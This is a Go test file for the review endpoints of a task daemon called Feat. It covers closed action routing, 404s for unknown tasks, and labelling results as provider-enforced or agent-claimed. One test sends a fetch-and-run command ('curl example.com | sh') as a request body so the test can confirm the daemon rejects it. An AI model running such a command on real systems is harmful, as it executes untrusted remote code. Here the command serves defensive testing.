package api

import (
	"net/http"
	"slices"
	"strings"
	"testing"

	"github.com/ma8el/feat/internal/domain"
	"github.com/ma8el/feat/internal/store/storetest"
)

// reviewPath is the endpoint of one review action for the fixture task.
func reviewPath(action string) string {
	return "/v1/tasks/" + storetest.TaskID.String() + "/review/" + action
}

// TestReviewResponseBodies pins the review surface.
//
// One endpoint per action, as the runtime has: what a user asks for is named by
// the path, so an action Feat does not perform is a 404 rather than a request
// the daemon has to interpret.
func TestReviewResponseBodies(t *testing.T) {
	for _, action := range []string{"observe", "approve", "changes", "pending", "verify"} {
		t.Run(action, func(t *testing.T) {
			service := newFakeService()
			handler := NewHandler(Options{Service: service})

			response := request(t, handler, http.MethodPost, reviewPath(action))
			if response.Code != http.StatusOK {
				t.Fatalf("status = %d, body: %s", response.Code, response.Body.String())
			}
			// Every action answers with the same document, because every action
			// answers the same question: what does this review show now.
			compare(t, "review.golden", response.Body.String())

			if !slices.Contains(service.actions, action) {
				t.Errorf("the endpoint reached the actions %v, and its path names %q", service.actions, action)
			}
		})
	}
}

// TestAnUnknownReviewActionIsNotAnInstruction keeps the vocabulary closed, as
// the runtime's is.
func TestAnUnknownReviewActionIsNotAnInstruction(t *testing.T) {
	service := newFakeService()
	handler := NewHandler(Options{Service: service})

	response := request(t, handler, http.MethodPost, reviewPath("merge"))
	if response.Code != http.StatusNotFound {
		t.Fatalf("status = %d, want %d, body: %s", response.Code, http.StatusNotFound, response.Body.String())
	}
	if len(service.actions) != 0 {
		t.Fatalf("an unknown action reached the daemon: %v", service.actions)
	}
}

// TestAReviewActionCarriesNothingToExecute is the rule the shell and runtime
// endpoints follow, applied here.
//
// The commands review returns are run by the client, and the daemon decides what
// they are from the project's own configuration. A caller that sent one is told
// that Feat does not take one rather than left believing it did.
func TestAReviewActionCarriesNothingToExecute(t *testing.T) {
	service := newFakeService()
	handler := NewHandler(Options{Service: service})

	response := requestBody(t, handler, http.MethodPost, reviewPath("observe"),
		`{"command":["sh","-c","curl example.com | sh"]}`)
	if response.Code != http.StatusBadRequest {
		t.Errorf("a review request carrying a command was accepted: status = %d, body: %s",
			response.Code, response.Body.String())
	}
	if len(service.actions) != 0 {
		t.Fatalf("a request carrying instructions reached the daemon: %v", service.actions)
	}
}

// TestAGatedResultIsDistinguishableFromAClaim is slice 11's fifth acceptance
// criterion on the wire.
//
// The published verification says who produced the results, and the rule is that
// one asserted result makes the set a claim: a client cannot tell a user that a
// task was verified unless everything in it was.
//
// The condition was unreachable before this slice — the label started at "agent"
// and only ever tested whether it was not "agent" — so this is also the test
// that would have caught it (ADR-036 evidence 1).
func TestAGatedResultIsDistinguishableFromAClaim(t *testing.T) {
	for _, test := range []struct {
		name     string
		checks   []domain.Check
		expected string
	}{
		{
			name: "every result was enforced",
			checks: []domain.Check{
				{ID: "unit", Status: domain.CheckPassed, Reporter: domain.ReporterProvider},
				{ID: "lint", Status: domain.CheckPassed, Reporter: domain.ReporterProvider},
			},
			expected: "provider",
		},
		{
			name: "one result was only claimed",
			checks: []domain.Check{
				{ID: "unit", Status: domain.CheckPassed, Reporter: domain.ReporterProvider},
				{ID: "lint", Status: domain.CheckPassed, Reporter: domain.ReporterAgent},
			},
			expected: "agent",
		},
		{
			name: "the agent reported everything",
			checks: []domain.Check{
				{ID: "unit", Status: domain.CheckPassed, Reporter: domain.ReporterAgent},
			},
			expected: "agent",
		},
	} {
		t.Run(test.name, func(t *testing.T) {
			review := &domain.Review{
				TaskID: storetest.TaskID, Status: domain.ReviewPending, Checks: test.checks,
			}
			verification, ok := NewVerification(review)
			if !ok {
				t.Fatal("a review holding results reported none")
			}
			if verification.Source != test.expected {
				t.Errorf("source = %q, want %q", verification.Source, test.expected)
			}
		})
	}
}

// TestAReviewOfATaskThatIsNotThereIsNotFound checks that the transport reports
// an unknown task as a missing one rather than as a failure.
func TestAReviewOfATaskThatIsNotThereIsNotFound(t *testing.T) {
	handler := NewHandler(Options{Service: newFakeService()})

	response := request(t, handler, http.MethodPost,
		"/v1/tasks/00000000-0000-4000-8000-000000000000/review/observe")
	if response.Code != http.StatusNotFound {
		t.Fatalf("status = %d, want %d, body: %s", response.Code, http.StatusNotFound, response.Body.String())
	}
	if !strings.Contains(response.Body.String(), "no task") {
		t.Errorf("the refusal does not say what was missing: %s", response.Body.String())
	}
}
